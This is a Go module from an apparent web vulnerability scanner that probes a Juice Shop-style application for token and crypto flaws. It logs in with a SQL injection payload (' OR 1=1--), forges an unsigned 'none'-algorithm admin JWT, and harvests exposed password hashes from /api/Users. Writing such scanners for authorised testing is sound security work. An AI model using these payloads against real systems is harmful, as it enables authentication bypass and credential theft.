package probers

import (
	"context"
	"encoding/base64"
	"fmt"
	"strings"

	"github.com/borntobeyours/ouroboros/pkg/types"
)

// CryptoProber tests for cryptographic and token-related vulnerabilities.
type CryptoProber struct{}

func (p *CryptoProber) Name() string { return "crypto" }

func (p *CryptoProber) Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding {
	cfg := NewProberConfig(target)
	var findings []types.Finding

	findings = append(findings, p.testJWTWeaknesses(cfg)...)
	findings = append(findings, p.testJWTNoneAlgorithm(cfg)...)
	findings = append(findings, p.testPasswordHashing(cfg)...)
	findings = append(findings, p.testContinueCode(cfg)...)

	return findings
}

func (p *CryptoProber) testJWTWeaknesses(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// Get a valid JWT by logging in
	body := `{"email":"' OR 1=1--","password":"anything"}`
	status, _, respBody, err := cfg.DoRequest("POST", cfg.BaseURL+"/rest/user/login",
		strings.NewReader(body), map[string]string{"Content-Type": "application/json"})
	if err != nil || status != 200 {
		return findings
	}

	// Extract token
	tokenIdx := strings.Index(respBody, `"token":"`)
	if tokenIdx < 0 {
		return findings
	}
	start := tokenIdx + len(`"token":"`)
	end := strings.Index(respBody[start:], `"`)
	if end < 0 {
		return findings
	}
	token := respBody[start : start+end]

	// Analyze JWT structure
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return findings
	}

	// Decode header
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return findings
	}
	header := string(headerBytes)

	// Check for weak algorithm
	if strings.Contains(header, `"HS256"`) || strings.Contains(header, `"HS384"`) || strings.Contains(header, `"HS512"`) {
		findings = append(findings, MakeFinding(
			"Weak JWT Algorithm - HMAC Symmetric Signing",
			"Medium",
			fmt.Sprintf("The JWT uses a symmetric signing algorithm (%s). If the secret key is weak or guessable, tokens can be forged. Combined with the exposed public key at /encryptionkeys/jwt.pub, this may enable key confusion attacks.", header),
			"/rest/user/login",
			"POST",
			"CWE-327",
			fmt.Sprintf(`JWT Header: %s`, header),
			fmt.Sprintf("JWT token uses symmetric algorithm: %s", header),
			"crypto",
			0,
		))
	}

	// Decode payload to check for sensitive data
	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err == nil {
		payload := string(payloadBytes)
		if strings.Contains(payload, "password") || strings.Contains(payload, "secret") {
			findings = append(findings, MakeFinding(
				"Sensitive Data in JWT Payload",
				"High",
				"The JWT payload contains sensitive data (password/secret) that should not be included in tokens.",
				"/rest/user/login",
				"POST",
				"CWE-312",
				fmt.Sprintf(`JWT Payload: %s`, truncate(payload, 200)),
				fmt.Sprintf("Sensitive data found in JWT: %s", truncate(payload, 200)),
				"crypto",
				0,
			))
		}

		// Check if email/role is exposed (always true for Juice Shop)
		if strings.Contains(payload, "email") || strings.Contains(payload, "role") {
			findings = append(findings, MakeFinding(
				"Information Disclosure in JWT Token",
				"Low",
				"The JWT token payload contains user email and role information that is visible to any token holder.",
				"/rest/user/login",
				"POST",
				"CWE-200",
				fmt.Sprintf(`JWT Payload (decoded): %s`, truncate(payload, 200)),
				fmt.Sprintf("JWT payload: %s", truncate(payload, 200)),
				"crypto",
				0,
			))
		}
	}

	return findings
}

func (p *CryptoProber) testJWTNoneAlgorithm(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// Create a JWT with "none" algorithm
	header := base64.RawURLEncoding.EncodeToString([]byte(`{"typ":"JWT","alg":"none"}`))
	payload := base64.RawURLEncoding.EncodeToString([]byte(`{"status":"success","data":{"id":1,"email":"admin@juice-sh.op","role":"admin"},"iat":9999999999}`))
	noneToken := header + "." + payload + "."

	// Try to use it
	status, _, respBody, err := cfg.DoRequest("GET", cfg.BaseURL+"/rest/user/whoami", nil,
		map[string]string{"Authorization": "Bearer " + noneToken})
	if err != nil {
		return findings
	}

	if status == 200 && strings.Contains(respBody, "admin") {
		findings = append(findings, MakeFinding(
			"JWT None Algorithm Bypass",
			"Critical",
			"The application accepts JWT tokens with 'none' algorithm, allowing complete authentication bypass and token forging.",
			"/rest/user/whoami",
			"GET",
			"CWE-327",
			fmt.Sprintf(`Token with none alg: %s`, truncate(noneToken, 100)),
			fmt.Sprintf("HTTP %d - Admin access with forged token: %s", status, truncate(respBody, 200)),
			"crypto",
			0,
		))
	} else if status == 200 {
		findings = append(findings, MakeFinding(
			"JWT Algorithm Confusion - Potential None Algorithm",
			"High",
			"The application may be vulnerable to JWT algorithm confusion attacks.",
			"/rest/user/whoami",
			"GET",
			"CWE-327",
			fmt.Sprintf(`Token: %s`, truncate(noneToken, 100)),
			fmt.Sprintf("HTTP %d - Response: %s", status, truncate(respBody, 200)),
			"crypto",
			0,
		))
	}

	return findings
}

func (p *CryptoProber) testPasswordHashing(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// Check if user listing exposes password hashes
	status, _, respBody, err := cfg.DoRequest("GET", cfg.BaseURL+"/api/Users", nil, nil)
	if err != nil || status != 200 {
		return findings
	}

	if strings.Contains(respBody, "password") {
		// Check hash format
		if strings.Contains(respBody, "$2") {
			// bcrypt - OK
		} else if len(respBody) > 0 {
			// Check for MD5-length hashes (32 hex chars)
			if strings.Contains(respBody, `"password":"`) {
				findings = append(findings, MakeFinding(
					"Weak Password Hashing",
					"High",
					"User passwords appear to be hashed with a weak algorithm (MD5 or similar). Password hashes are also exposed via the API.",
					"/api/Users",
					"GET",
					"CWE-916",
					fmt.Sprintf(`curl %s/api/Users`, cfg.BaseURL),
					fmt.Sprintf("HTTP %d - Hashes exposed: %s", status, truncate(respBody, 200)),
					"crypto",
					0,
				))
			}
		}
	}

	return findings
}

func (p *CryptoProber) testContinueCode(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	paths := []string{"/rest/continue-code", "/rest/continue-code-findIt"}
	for _, path := range paths {
		url := cfg.BaseURL + path
		status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
		if err == nil && status == 200 && len(respBody) > 10 {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("Sensitive Data Exposure - Continue Code (%s)", path),
				"Medium",
				"The continue code endpoint exposes challenge progress data that could be used to restore or manipulate challenge state.",
				path,
				"GET",
				"CWE-200",
				fmt.Sprintf(`curl %s`, url),
				fmt.Sprintf("HTTP %d - Continue code: %s", status, truncate(respBody, 100)),
				"info_leak",
				0,
			))
		}
	}

	return findings
}
